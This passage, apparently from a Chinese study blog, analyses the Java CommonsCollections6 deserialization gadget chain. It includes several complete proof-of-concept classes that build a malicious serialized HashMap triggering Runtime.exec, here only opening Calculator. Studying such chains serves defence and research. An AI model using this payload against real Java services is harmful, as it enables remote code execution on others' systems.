class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>在 JDK 8u71 之后，<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject()</code>方法发生了变化导致无法再触发<code>LazyMap</code>类的<code>get()</code>方法，而思路自然而然就是再次寻找其他能触发<code>LazyMap#get()</code>的地方。在利用链中可以看到最后找到的是<code>TiedMapEntry</code>类</p><p>跟进查看<code>TiedMapEntry#hashCode()</code>方法源码，调用了<code>this.getValue();</code><br><img src="images/image-20221004215622854.png" alt="image-20221004215622854"></p><p>接着跟进<code>this.getValue()</code>方法<br><img src="images/image-20221004220012400.png" alt="image-20221004220012400"></p><p>可以看到在<code>getValue()</code>中调用了<code>map.get()</code>方法，并且<code>map</code>和<code>key</code>都是通过构造函数传入，完全可控，所以可以通过构造传参调用到<code>LazyMap#get()</code>，满足了我们的期望。</p><p>接下来就是寻找可以调用<code>TiedMapEntry#hashCode()</code>，在前面已经学习过的<a href="./02-反序列化专区/0-URLDNS利用链/URLDNS利用链.md">URLDNS利用链分析</a>章节中，我们已经知道在<code>HashMap#readObject()</code>里，<code>putVal()</code>方法对<code>key</code>进行了<code>hash()</code>计算，进而调用传进来的<code>key</code>的<code>hashCode()</code>的方法。</p><p>因此我们只要让<code>key</code>为<code>TiedMapEntry</code>对象，就可以完成整个攻击链。开始编写初始 POC：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但运行后却没有弹出计算器，开始找找原因，我们在<code>LazyMap#get()</code>方法处打断点，结果发现一共调用了两次<code>LazyMap#get()</code></p><p>第一次时进入了 if 方法<br><img src="images/image-20221008152547485.png" alt="image-20221008152547485"></p><p>第二次时没有进入 if 方法<br><img src="images/image-20221008152629215.png" alt="image-20221008152629215"></p><p>为什么会调用两次<code>LazyMap#get()</code>方法呢？仔细再跟一遍才想起来<code>HashMap#put()</code>方法也会调用到<code>hashcode()</code><br><img src="images/image-20221008152723595.png" alt="image-20221008152723595"></p><p>因此在<code>expMap.put(tiedMapEntry,&quot;valueTest&quot;);</code>语句时就一次触发了一次<code>LazyMap#get()</code>利用链，但因为我们故意制造的<code>fakeTransformers</code>所以没有触发命令执行，但是却在这里将<code>keyTest</code>添加进了<code>outerMap</code>中。<br><img src="images/image-20221008153011697.png" alt="image-20221008153011697"></p><p>因此在经过反序列化后调用利用链时，再次进行 if 判断时，<code>keyTest</code>在<code>outermap</code>对象里，跳过了判断进入 else 语句，导致无法触发命令执行。</p><p>根据 p 牛的做法就是再写一句<code>outerMap.remove(&quot;keyTest&quot;);</code>将 key 从 <code>outerMap</code>中移除，因此最终 POC 为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221008153450633.png" alt="image-20221008153450633"></p><p>除了<code>outerMap.remove()</code>删除键值对，我们还可以通过替换 key 的方式进行处理。</p><p><code>HashMap</code>将键值对存储在了<code>Node&lt;K,V&gt;[] table</code>中，并封装在<code>Node</code>对象里，其中<code>Node</code>是<code>HashMap</code>内部的静态类<br><img src="images/image-20221008161018495.png" alt="image-20221008161018495"></p><p>因此我们首先需要通过反射获取到<code>table</code>字段，然后因为我们没有获取到<code>Node</code>类，所以之类需要转换为<code>Object</code>类型。最后取到数组中的 key 进行替换<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射获取table</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[]) table.get(expMap);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="type">Field</span> <span class="variable">expMapKey</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        expMapKey.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        expMapKey.set(node, tiedMapEntry);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span 